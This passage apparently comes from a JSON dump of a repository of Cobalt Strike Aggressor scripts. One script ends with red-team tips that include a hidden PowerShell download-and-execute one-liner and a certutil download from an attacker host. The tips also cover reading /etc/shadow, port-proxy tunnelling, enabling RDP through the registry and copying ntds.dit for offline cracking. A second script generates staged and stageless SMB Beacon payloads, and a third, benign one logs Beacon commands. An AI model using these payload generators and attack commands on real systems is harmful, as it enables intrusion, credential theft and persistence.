\"\\t\\cBw\");\r\n\t\tblog2($1, \"\\t\\cBroute -n\");\r\n\t\tblog2($1, \"\\t\\cBcat /etc/passwd\");\r\n\t\tblog2($1, \"\\t\\cBcat /etc/passwd | awk -F : '{if (\\$3 > 999 && \\$3 < 60001) print \\$1,\\$3,\\$6}'\");\r\n\t\tblog2($1, \"\\t\\cBcat /etc/motd\");\r\n\t\tblog2($1, \"\\t\\cBcat /etc/group\");\r\n\t\tblog2($1, \"\\t\\cBcat /etc/shadow\\n\");\r\n\r\n\r\n\t}\r\n\r\n\tif ($2 ismatch 'Tips') {\r\n\r\n\t\tblog($1, \"\\t\\c4====== Red Team Tips ======\\n\");\r\n\t\t#Red Tips\r\n\t\tblog2($1, \"\\t\\cBhttps://github.com/vysec/RedTips (If you have InterWebs)\");\r\n\t\tblog2($1, \"\\t\\cBhttps://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt (InterWebs Required)\");\r\n\t\tblog2($1, \"\\t\\cBNeed a map of the network? Run Bloodhound!! https://github.com/BloodHoundAD/BloodHound\");\r\n\t\tblog2($1, \"\\t\\cBAlways check sysvols!! Domain Controllers will have them, you'll be surprised how some are still viewable by normal users.\");\r\n\t\tblog2($1, \"\\t\\cBnet user a specific user and see if they are executing any logon scripts, those might contain juicy information.\");\r\n\t\tblog2($1, \"\\t\\cBAlways check Desktops/Documents/Downloads/Favorites folders for trails of valuable information left behind.\");\r\n\t\tblog2($1, \"\\t\\cBFind those Fileservers! Sysadmins leave behind all kinds of goodies there.\");\r\n\t\tblog2($1, \"\\t\\cBUse a Windows 7 workstation to tunnel your traffic natively. netsh int portproxy v4tov4 listenport=[port] connecthost=[AttackerIP] connectport=[port]\");\r\n\t\tblog2($1, \"\\t\\cBUse certutil.exe -urlcache -split -f [http://AttackerIP/RemoteFile] to download a file to the target machine.\");\r\n\t\tblog2($1, \"\\t\\cBThe all powerful one-liner powershell.exe -w hidden -nop -ep bypass -c \\\"IEX ((new-object net.webclient).downloadstring('http://[domainname|IP]:[port]/[file]'))\\\"\");\r\n\t\tblog2($1, \"\\t\\cBUse tasklist /S [RemoteComputer] /SVC to see if you have access to that remote machine.\");\r\n\t\tblog2($1, \"\\t\\cBEnable RDP through the registry: reg add “HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f\");\r\n\t\tblog2($1, \"\\t\\cBPlease wrap/encode/pack your payloads if you have to drop to disk!\");\r\n\t\tblog2($1, \"\\t\\cBTry to stay in memory and avoid putting files on disk.\");\r\n\t\tblog2($1, \"\\t\\cBLive off the land!! Use what is on the target, native windows binaries are very powerful!\");\r\n\t\tblog2($1, \"\\t\\cBUse AD naming schemes to your advantage, sysadmins are lazy and use organization to help them with all the IT work they do on a daily basis.\");\r\n\t\tblog2($1, \"\\t\\cBEnterprise Admins will almost always have the rights to move laterally to those foreign domain controllers, 9 times out of 10 they use the same password!\");\r\n\t\tblog2($1, \"\\t\\cBInvoke-NinjaCopy.ps1 is super powerful and should be used to grab the ntds.dit and SYSTEM files for offline cracking.\");\r\n\t\tblog2($1, \"\\t\\cBHave multiple points of presence on a network for longer engagements. Persistence can go a long way for Security Operations.\");\r\n\t\tblog2($1, \"\\t\\cBcmd.exe and powershell.exe blocked by GPO? Find a process that's user owned and started on bootup for process injection to bypass that.\");\r\n\t\tblog2($1, \"\\t\\cBJust because you acquired initial access doesn't mean you stop doing recon. Network/Host Enumeration is always the most important part.\");\r\n\t\tblog2($1, \"\\t\\cBInvoke-ReverseDnsLookup.ps1 of powersploit finds those machines on the network that has DNS records and can provide more SA for an attacker.\");\r\n\t\tblog2($1, \"\\t\\cBNeed a Temporary web server? Use Python! python -m SimpleHTTPServer [port]\\n\");\r\n\r\n\t}\r\n\r\n\tif ($2 ismatch 'Smile') {\r\n\t\tlocal('$smile');\r\n\t\t$smile = \"\\n\";\r\n\t\t$smile .= \"\\t\\c9░░░░░░░░░░░███████░░░░░░░░░░░\\n\";\r\n\t\t$smile .= \"\\t\\c9░░░░░░░████░░░░░░░████░░░░░░░\\n\";\r\n\t\t$smile .= \"\\t\\c9░░░░░██░░░░░░░░░░░░░░░██░░░░░\\n\";\r\n\t\t$smile .= \"\\t\\c9░░░██░░░░░░░░░░░░░░░░░░░██░░░\\n\";\r\n\t\t$smile .= \"\\t\\c9░░█░░░░░░░░░░░░░░░░░░░░░░░█░░\\n\";\r\n\t\t$smile .= \"\\t\\c9░█░░████░░░░░░░░██████░░░░░█░\\n\";\r\n\t\t$smile .= \"\\t\\c9█░░█░░░██░░░░░░█░░░░███░░░░░█\\n\";\r\n\t\t$smile .= \"\\t\\c9█░█░░░░░░█░░░░░█░░░░░░░█░░░░█\\n\";\r\n\t\t$smile .= \"\\t\\c9█░█████████░░░░█████████░░░░█\\n\";\r\n\t\t$smile .= \"\\t\\c9█░░░░░░░░░░░░░░░░░░░░░░░░░░░█\\n\";\r\n\t\t$smile .= \"\\t\\c9█░░░░░░░░░░░░░░░░░░░░░░░░░░░█\\n\";\r\n\t\t$smile .= \"\\t\\c9█░░░████████████████████░░░░█\\n\";\r\n\t\t$smile .= \"\\t\\c9░█░░░█▓▓▓▓▓▓▓▓█████▓▓▓█░░░░█░\\n\";\r\n\t\t$smile .= \"\\t\\c9░█░░░░█▓▓▓▓▓██░░░░██▓██░░░░█░\\n\";\r\n\t\t$smile .= \"\\t\\c9░░█░░░░██▓▓█░░░░░░░▒██░░░░█░░\\n\";\r\n\t\t$smile .= \"\\t\\c9░░░██░░░░██░░░░░░▒██░░░░██░░░\\n\";\r\n\t\t$smile .= \"\\t\\c9░░░░░██░░░░███████░░░░██░░░░░\\n\";\r\n\t\t$smile .= \"\\t\\c9░░░░░░░███░░░░░░░░░███░░░░░░░\\n\";\r\n\t\t$smile .= \"\\t\\c9░░░░░░░░░░█████████░░░░░░░░░░\\n\";\r\n\t\tblog($1, $smile);\r\n\t}\r\n\r\n\tif ($2 is $null) {\r\n\t\tberror($1, \"\\c4Need to specify additional syntax! Use the 'List' command for help\");\r\n\t\tblog($1, \"\\cBSyntax Example: RedRepo Windows\");\r\n\t}\r\n\r\n}\r\n\r\n"
        },
        {
          "name": "SMBPayloadGenerator.cna",
          "type": "blob",
          "size": 7.2041015625,
          "content": "#SMB Artifact Payload Generator\n#Author: @r3dQu1nn\n#Generates any type of Stageless/Staged Payload based off a SMB Listener\n\n#Custom Directory for Payloads\nmkdir(\"/opt/cobaltstrike/SMB_Staged_Payloads\");\nmkdir(\"/opt/cobaltstrike/SMB_Stageless_Payloads\");\n\nmenubar(\"SMB Payload Generator\", \"payloadgenerator\", 2);\npopup payloadgenerator {\n\tmenu \"&SMB Payload Generator\" {\n\t\titem \"&SMB Staged Payloads\" {\n\t\t\tpayloadgeneratestaged();\n\t\t}\n\t\titem \"&SMB Stageless Payloads\" {\n\t\t\tpayloadgeneratestageless();\n\t\t}\n\t}\n}\n\nsub payloadgeneratestaged {\n\n\t$dialog = dialog(\"SMB Payload Generator\", %(listener => \"Listener: \", payload_type => \"Payload Type: \", Output => \"Output: \"), &Staged_Output);\n\tdialog_description($dialog, \"Generates a Staged or Stageless SMB Payload based on the selected SMB listener. **Payloads will be stored in /opt/cobaltstrike/SMB_Staged_Payloads**\");\n\tdrow_listener_smb($dialog, \"listener\", \"Listener: \");\n    \tdrow_text($dialog, \"Name\", \"Payload Name: \");\n    \tdrow_combobox($dialog, \"payload_type\", \"Payload Type: \", @(\"Staged\"));\n    \tdrow_combobox($dialog, \"Output\", \"Output: \", @(\"dll\", \"dllx64\", \"exe\", \"powershell\", \"python\", \"svcexe\", \"vbscript\"));\n    \tdbutton_action($dialog, \"Generate\");\n    \tdialog_show($dialog);\n    \n}\n\nsub payloadgeneratestageless {\n\n\t$dialog = dialog(\"SMB Payload Generator\", %(listener => \"Listener: \", payload_type => \"Payload Type: \", Output => \"Output: \"), &Stageless_Output);\n\tdialog_description($dialog, \"Generates a Staged or Stageless SMB Payload based on the selected SMB listener. **Payloads will be stored in /opt/cobaltstrike/SMB_Stageless_Payloads**\");\n    \tdrow_listener_smb($dialog, \"listener\", \"Listener: \");\n    \tdrow_text($dialog, \"Name\", \"Payload Name: \");\n    \tdrow_combobox($dialog, \"payload_type\", \"Payload Type: \", @(\"Stageless\"));\n    \tdrow_combobox($dialog, \"Output\", \"Output: \", @(\"dll\", \"dllx64\", \"exe\", \"powershell\", \"svcexe\", \"raw\"));\n    \tdbutton_action($dialog, \"Generate\");\n    \tdialog_show($dialog);\n    \n}\n\nsub Staged_Output {\n\n\t#Error Check\n\tif ($3['Name'] ismatch \"\") {\n\t\tberror($1, 'You did not select a proper SMB Listener or Input a Payload Name!');\n\t\tshow_message(\"Please select a proper SMB Listener and Input a Payload Name!\");\n\t}\n\t#Staged Payloads\n\telse if ($3['Output'] eq 'dll') {\n\t\t$data = artifact($3['listener'], \"dll\");\n\t\t$handle = openf(\">/opt/cobaltstrike/SMB_Staged_Payloads/\". $3['Name'] .\".dll\");\n\t\twriteb($handle, $data);\n\t\tclosef($handle);\n\t\tshow_message(\"Saved SMB DLL at /opt/cobaltstrike/SMB_Staged_Payloads/\". $3['Name'] .\".dll\");\n\t\tclear($3);\n\t}\n\telse if ($3['Output'] eq 'dllx64') {\n\t\t$data = artifact($3['listener'], \"dllx64\");\n\t\t$handle = openf(\">/opt/cobaltstrike/SMB_Staged_Payloads/\". $3['Name'] .\".dll\");\n\t\twriteb($handle, $data);\n\t\tclosef($handle);\n\t\tshow_message(\"Saved 64 bit SMB DLL at /opt/cobaltstrike/SMB_Staged_Payloads/\". $3['Name'] .\".dll\");\n\t\tclear($3);\n\t}\n\telse if ($3['Output'] eq 'exe') {\n\t\t$data = artifact($3['listener'], \"exe\");\n\t\t$handle = openf(\">/opt/cobaltstrike/SMB_Staged_Payloads/\". $3['Name'] .\".exe\");\n\t\twriteb($handle, $data);\n\t\tclosef($handle);\n\t\tshow_message(\"Saved EXE at /opt/cobaltstrike/SMB_Staged_Payloads/\". $3['Name'] .\".exe\");\n\t\tclear($3);\n\t}\n\telse if ($3['Output'] eq 'powershell') {\n\t\t$data = artifact($3['listener'], \"powershell\");\n\t\t$handle = openf(\">/opt/cobaltstrike/SMB_Staged_Payloads/\". $3['Name'] .\"\");\n\t\twriteb($handle, $data);\n\t\tclosef($handle);\n\t\tshow_message(\"Saved Powershell SMB Payload at /opt/cobaltstrike/SMB_Staged_Payloads/\". $3['Name'] .\"\");\n\t\tclear($3);\n\t}\n\telse if ($3['payload_type'] eq 'Staged' && $3['Output'] eq 'python') {\n\t\t$data = artifact($3['listener'], \"python\");\n\t\t$handle = openf(\">/opt/cobaltstrike/SMB_Staged_Payloads/\". $3['Name'] .\".py\");\n\t\twriteb($handle, $data);\n\t\tclosef($handle);\n\t\tshow_message(\"Saved Python SMB Payload at /opt/cobaltstrike/SMB_Staged_Payloads/\". $3['Name'] .\".py\");\n\t\tclear($3);\n\t}\n\telse if ($3['payload_type'] eq 'Staged' && $3['Output'] eq 'svcexe') {\n\t\t$data = artifact($3['listener'], \"svcexe\");\n\t\t$handle = openf(\">/opt/cobaltstrike/SMB_Staged_Payloads/\". $3['Name'] .\".exe\");\n\t\twriteb($handle, $data);\n\t\tclosef($handle);\n\t\tshow_message(\"Saved SVCEXE at /opt/cobaltstrike/SMB_Staged_Payloads/\". $3['Name'] .\".exe\");\n\t\tclear($3);\n\t}\n\telse if ($3['payload_type'] eq 'Staged' && $3['Output'] eq 'vbscript') {\n\t\t$data = artifact($3['listener'], \"vbscript\");\n\t\t$handle = openf(\">/opt/cobaltstrike/SMB_Staged_Payloads/\". $3['Name'] .\".vbs\");\n\t\twriteb($handle, $data);\n\t\tclosef($handle);\n\t\tshow_message(\"Saved vbscript SMB Payload at /opt/cobaltstrike/SMB_Staged_Payloads/\". $3['Name'] .\".vbs\");\n\t\tclear($3);\n\t}\t\n\t\n}\n\nsub Stageless_Output {\n\t\n\tif ($3['Name'] ismatch \"\") {\n\t\tberror($1, 'You did not select a proper SMB Listener or Input a Payload Name!');\n\t\tshow_message(\"Please select a proper SMB Listener and Input a Payload Name!\");\n\t}\n\t#Stageless Payloads\n\telse if ($3['Output'] eq 'dll') {\n\t\tartifact_stageless($3['listener'], \"dll\", \"x86\", \"\", &dll);\n\t\t$Name = \"\".$3['Name'].\"\";\n\t}\n\telse if ($3['Output'] eq 'dllx64') {\n\t\tartifact_stageless($3['listener'], \"dllx64\", \"x86\", \"\", &dllx64);\n\t\t$Name = \"\".$3['Name'].\"\";\n\t}\n\telse if ($3['Output'] eq 'exe') {\n\t\tartifact_stageless($3['listener'], \"exe\", \"x86\", \"\", &exe);\n\t\t$Name = \"\".$3['Name'].\"\";\n\t}\n\telse if ($3['Output'] eq 'powershell') {\n\t\tartifact_stageless($3['listener'], \"powershell\", \"x86\", \"\", &ps1);\n\t\t$Name = \"\".$3['Name'].\"\";\n\t}\n\telse if ($3['Output'] eq 'raw') {\n\t\tartifact_stageless($3['listener'], \"raw\", \"x86\", \"\", &raw);\n\t\t$Name = \"\".$3['Name'].\"\";\n\t}\n\telse if ($3['Output'] eq 'svcexe') {\n\t\tartifact_stageless($3['listener'], \"svcexe\", \"x86\", \"\", &svcexe);\n\t\t$Name = \"\".$3['Name'].\"\";\n\t}\n}\n\n#Sub Functions for Stageless Artifacts\nsub dll {\n\n\t#Write and Save Payload\n\tlocal('$cradle');\n\t$cradle = openf(\">/opt/cobaltstrike/SMB_Stageless_Payloads/\". $Name .\".dll\");\n\twriteb($cradle, $1);\n\tclosef($cradle);\n\tshow_message(\"Saved SMB DLL at /opt/cobaltstrike/SMB_Stageless_Payloads/\". $Name .\".dll\");\n\n}\n\nsub dllx64 {\n\n\t#Write and Save Payload\n\tlocal('$cradle1');\n\t$cradle1 = openf(\">/opt/cobaltstrike/SMB_Stageless_Payloads/\". $Name .\".dll\");\n\twriteb($cradle1, $1);\n\tclosef($cradle1);\n\tshow_message(\"Saved 64 bit SMB DLL at /opt/cobaltstrike/SMB_Stageless_Payloads/\". $Name .\".dll\");\n\n}\n\nsub exe {\n\n\t#Write and Save Payload\n\tlocal('$cradle2');\n\t$cradle2 = openf(\">/opt/cobaltstrike/SMB_Stageless_Payloads/\". $Name .\".exe\");\n\twriteb($cradle2, $1);\n\tclosef($cradle2);\n\tshow_message(\"Saved EXE at /opt/cobaltstrike/SMB_Stageless_Payloads/\". $Name .\".exe\");\n\n}\n\nsub ps1 {\n\n\t#Write and Save Payload\n\tlocal('$cradle3');\n\t$cradle3 = openf(\">/opt/cobaltstrike/SMB_Stageless_Payloads/\". $Name .\"\");\n\twriteb($cradle3, $1);\n\tclosef($cradle3);\n\tshow_message(\"Saved Powershell SMB Payload at /opt/cobaltstrike/SMB_Stageless_Payloads/\". $Name .\"\");\n\n}\n\nsub raw {\n\n\t#Write and Save Payload\n\tlocal('$cradle4');\n\t$cradle4 = openf(\">/opt/cobaltstrike/SMB_Stageless_Payloads/\". $Name .\".bin\");\n\twriteb($cradle4, $1);\n\tclosef($cradle4);\n\tshow_message(\"Saved Raw SMB Payload at /opt/cobaltstrike/SMB_Stageless_Payloads/\". $Name .\".bin\");\n\n}\n\nsub svcexe {\n\n\t#Write and Save Payload\n\tlocal('$cradle5');\n\t$cradle5 = openf(\">/opt/cobaltstrike/SMB_Stageless_Payloads/\". $Name .\".exe\");\n\twriteb($cradle5, $1);\n\tclosef($cradle5);\n\tshow_message(\"Saved EXE at /opt/cobaltstrike/SMB_Stageless_Payloads/\". $Name .\".exe\");\n\n}\n"
        },
        {
          "name": "logvis.cna",
          "type": "blob",
          "size": 3.6259765625,
          "content": "# Beacon Command Log visualization\n# Author: @001SPARTaN (for @r3dqu1nn)\n# Tracks all your commands you executed on every beacon\n\nimport ui.*;\nimport table.*;\n\nimport java.awt.*;\nimport javax.swing.*;\nimport javax.swing.table.*;\n\nglobal('$model $console $table');\n\nsub updateTable {\n\tfork({\n\t\tlocal('$entry');\n\n\t\t# Clear the model so we can put new stuff in it.\n\t\t[$model clear: 1024];\n\n\t\tforeach @entry (data_query('beaconlog')) {\n            if (@entry[0] eq \"beacon_input\") {\n                %modelEntry['operator'] = @entry[2];\n                $bid = @entry[1];\n                %modelEntry['ip'] = binfo($bid, \"internal\");\n                %modelEntry['hostname'] = binfo($bid, \"computer\");\n                %modelEntry['user'] = binfo($bid, \"user\");\n                %modelEntry['pid'] = binfo($bid, \"pid\");\n                %modelEntry['command'] = @entry[3];\n                %modelEntry['timestamp'] = formatDate(@entry[4], \"MMM dd HH:mm:ss z\");\n                # Add the new entry to $model\n                [$model addEntry: %modelEntry];\n            }\n\t\t}\n\t\t# Update with the new table\n\t\t[$model fireListeners];\n\t}, \\$model);\n}\n\n# setupPopupMenu provided by Raphael Mudge\n# https://gist.github.com/rsmudge/87ce80cd8d8d185c5870d559af2dc0c2\nsub setupPopupMenu {\n\t# we're using fork({}) to run this in a separate Aggressor Script environment.\n\t# This reduces deadlock potential due to Sleep's global interpreter lock\n\t#\n\t# this especially matters as our mouse listener will be fired for *everything*\n\t# to include mouse movements.\n\tfork({\n\t\t[$component addMouseListener: lambda({\n\t\t\tif ([$1 isPopupTrigger]) {\n\t\t\t\t# If right click, show popup\n\t\t\t\tshow_popup($1, $name, $component);\n\t\t\t}\n\t\t}, \\$component, \\$name)];\n\t}, $component => $1, $name => $2, $model => $model, $table => $table);\n}\n\nsub createVisualization {\n\tthis('$client');\n\t# GenericTableModel from table.*\n\t# Columns for each data model\n\t$model = [new GenericTableModel: @(\"operator\", \"ip\", \"hostname\", \"user\", \"pid\", \"command\", \"timestamp\"), \"beacon\", 16];\n\n\t# Create a table from the GenericTableModel\n\t$table = [new ATable: $model];\n\n\t# Controls how the column headers will sort the table\n\t$sorter = [new TableRowSorter: $model];\n\t[$sorter toggleSortOrder: 3];\n\n\t[$sorter setComparator: 0, {\n\t\treturn $1 cmp $2;\n\t}];\n\n\t[$sorter setComparator: 1, {\n\t\treturn $1 cmp $2;\n\t}];\n\n\t[$sorter setComparator: 2, {\n\t\treturn $1 cmp $2;\n\t}];\n\n\t[$sorter setComparator: 3, {\n\t\treturn $1 <=> $2;\n\t}];\n\n\t# Set $sorter as the row sorter for $table\n\t[$table setRowSorter: $sorter];\n\n\t# Create a split pane (divider you can drag around)\n\t$content = [new JScrollPane: $table];\n\n\t# Set popup menu for the table\n\tsetupPopupMenu($table, \"command_log\");\n\n\tupdateTable();\n\n\t# Register the visualization with CS\n\taddVisualization(\"Beacon Command Log\", $content);\n\treturn $content;\n}\n\npopup command_log {\n\titem \"Copy\" {\n\t\tprintln(\"Right click captured!\");\n\t\t$selected = \"\";\n\t\tforeach $row ([$table getSelectedRows]) {\n            # operator [ip_hostname] user/proc | timestamp> command\n\t\t\t$operator = [$model getValueAt: $row, 0];\n            $ip = [$model getValueAt: $row, 1];\n            $hostname = [$model getValueAt: $row, 2];\n            $user = [$model getValueAt: $row, 3];\n            $proc = [$model getValueAt: $row, 4];\n            $time = [$model getValueAt: $row, 6];\n            $command = [$model getValueAt: $row, 5];\n\n            $selected .= \"$operator \\[$ip\\_$hostname\\] $user\\/$proc | $time\\> $command\\n\";\n\t\t}\n\t\tadd_to_clipboard($selected);\n\t}\n}\n\npopup view {\n\titem \"Command Log\" {\n\t\t# Show the visualization\n\t\taddTab(\"Beacon Command Log\", createVisualization(), \"All commands you have executed in a beacon\");\n\t}\n}\n\non beacon_input {\n\tupdateTable();\n}\n"
        }
      ]
    }
  ]
}